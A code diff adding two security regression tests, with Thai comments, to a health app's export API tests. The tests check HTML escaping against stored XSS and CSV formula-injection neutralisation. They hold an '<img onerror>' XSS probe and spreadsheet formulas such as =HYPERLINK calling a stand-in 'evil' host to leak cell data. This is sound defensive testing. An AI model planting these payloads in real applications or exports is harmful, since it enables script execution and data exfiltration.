@@ -421,3 +421,68 @@ test('GET /export (html) มี disclaimer + ห้าม days เกิน 90',
   assert.ok(html.includes('รายงานสุขภาพย้อนหลัง 90 วัน'), 'days=999 ถูก clamp เหลือ 90');
   assert.ok(html.includes('ไม่ใช่การวินิจฉัย'));
 });
+
+// stored XSS: detail/source มาจากผู้ใช้ (POST /observations) แล้วถูกต่อเข้า HTML ดิบ ๆ
+// ⇒ ใครบันทึกอาการด้วย <img onerror=...> ก็รันสคริปต์ใน origin ของแอปได้เมื่อมีคนเปิดรายงาน
+// (CSV escape quote อยู่แล้ว แต่ HTML ไม่เคย escape อะไรเลย)
+test('GET /export (html) ต้อง escape HTML ใน detail/source — กัน stored XSS', async () => {
+  await fetch(`${ts.baseUrl}/api/health/observations`, {
+    method: 'POST',
+    headers: { ...H, 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      category: 'APPETITE',
+      detail: '<img src=x onerror=alert(1)>',
+      source: '<b>sensor</b>',
+    }),
+  });
+  const res = await fetch(`${ts.baseUrl}/api/health/export?format=html&days=30`, { headers: H });
+  const html = await res.text();
+
+  assert.ok(!html.includes('<img src=x onerror=alert(1)>'), 'detail ต้องไม่ถูกส่งออกเป็นแท็กดิบ');
+  assert.ok(!html.includes('<b>sensor</b>'), 'source ต้องไม่ถูกส่งออกเป็นแท็กดิบ');
+  assert.ok(html.includes('&lt;img src=x onerror=alert(1)&gt;'), 'detail ต้องถูก escape เป็น entity');
+  assert.ok(html.includes('&lt;b&gt;sensor&lt;/b&gt;'), 'source ต้องถูก escape เป็น entity');
+});
+
+// ────────────────────────────────────────────────────────────────────────────
+// CSV formula injection (CWE-1236)
+//
+// ไฟล์ export ถูกเปิดใน Excel/Google Sheets ของผู้ดูแล ⇒ เซลล์ที่ขึ้นต้นด้วย
+// `=` `+` `-` `@` ถูกตีความเป็น "สูตร" ไม่ใช่ข้อความ
+// (เช่น =HYPERLINK("http://evil/?"&A1) หรือ =WEBSERVICE(...)) ⇒ ค่าที่ผู้ใช้บันทึก
+// (detail/source จาก POST /observations) ต้องถูก neutralize ด้วย apostrophe นำหน้า
+// — การ escape เครื่องหมายคำพูด ("" ) ไม่ช่วยเรื่องนี้เลย
+//
+// audit export ทำถูกอยู่แล้ว (`csvCell` ใน audit.routes.ts) — health export ตกหล่น
+// ────────────────────────────────────────────────────────────────────────────
+test('export CSV ต้อง neutralize สูตรในเซลล์ (formula injection)', async () => {
+  const payload = {
+    category: 'APPETITE',
+    detail: '=HYPERLINK("http://evil.example/x","คลิก")',
+    source: '+84900000000',
+  };
+  const created = await fetch(`${ts.baseUrl}/api/health/observations`, {
+    method: 'POST',
+    headers: { ...H, 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload),
+  });
+  assert.equal(created.status, 201);
+
+  const res = await fetch(`${ts.baseUrl}/api/health/export?format=csv&days=30`, { headers: H });
+  assert.equal(res.status, 200);
+  const csv = await res.text();
+
+  const row = csv.split(/\r?\n/).find((l) => l.includes('HYPERLINK'));
+  assert.ok(row, 'ต้องมีแถวของ observation ที่เพิ่งบันทึก');
+
+  // ทุกเซลล์ในแถว (ตัด quote ครอบออก) ต้องไม่ขึ้นต้นด้วยอักขระที่เริ่มสูตรได้
+  const cells = row.split(',').map((c) => c.replace(/^"|"$/g, ''));
+  for (const cell of cells) {
+    assert.ok(
+      !/^[=+\-@\t\r]/.test(cell),
+      `เซลล์ต้องไม่ขึ้นต้นด้วยอักขระสูตร: ${cell.slice(0, 40)}`
+    );
+  }
+  assert.ok(row.includes("'=HYPERLINK"), 'detail ต้องถูกเติม apostrophe นำหน้า (= กลายเป็นข้อความ)');
+  assert.ok(row.includes("'+84900000000"), 'source ต้องยังอยู่และถูก neutralize ด้วย apostrophe');
+});
